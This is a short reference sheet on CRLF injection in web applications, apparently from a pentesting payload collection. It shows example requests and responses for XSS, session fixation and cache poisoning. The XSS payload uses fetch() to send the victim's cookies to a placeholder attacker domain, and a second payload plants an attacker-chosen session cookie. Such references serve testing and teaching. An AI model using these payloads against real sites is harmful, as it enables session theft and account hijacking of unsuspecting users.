# CRLF Injection

## Table of Contents
- [XSS](#xss)
- [Session Fixation](#session-fixation)
- [Cache Poisoning](#cache-poisoning)

## XSS

### The response body can be controlled from a header, so a payload runs on the trusted origin even when the application has no reflected sink in its body. [^1]

- Terminating the header section and writing the body
    1. Request
        ```
        https://[VULNERABLE-SERVICE]/profile?lang=en%0d%0a%0d%0a%3Cscript%3Efetch('https://[ATTACKER-DOMAIN]/?c='%2Bdocument.cookie)%3C/script%3E
        ```

    2. Resulting response
        ```http
        HTTP/1.1 200 OK
        Content-Language: en

        <script>fetch('https://[ATTACKER-DOMAIN]/?c='+document.cookie)</script>
        ```

## Session Fixation

### An arbitrary cookie can be set on the victim's browser for the vulnerable origin.

- Fixing a session identifier
    1. Request
        ```
        https://[VULNERABLE-SERVICE]/redirect?url=%0d%0aSet-Cookie:%20SESSIONID%3Dattacker_value
        ```

    2. Resulting response
        ```http
        HTTP/1.1 302 Found
        Location: /home
        Set-Cookie: SESSIONID=attacker_value
        ```
    The victim then authenticates under a session identifier the attacker already knows.

## Cache Poisoning

### A self-targeted issue may escalate into one that affects every user served by the cache.

- Serving an attacker-controlled response to other users
    - When the injected `\r\n\r\n` produces a second, complete HTTP response, an intermediary can associate it with the following request and store it. Every user served that cache entry afterwards receives the attacker's response in place of the real page.

[^1]: Applies when the injection point is in a response the browser renders. A redirect response is followed rather than rendered, so its body does not execute.
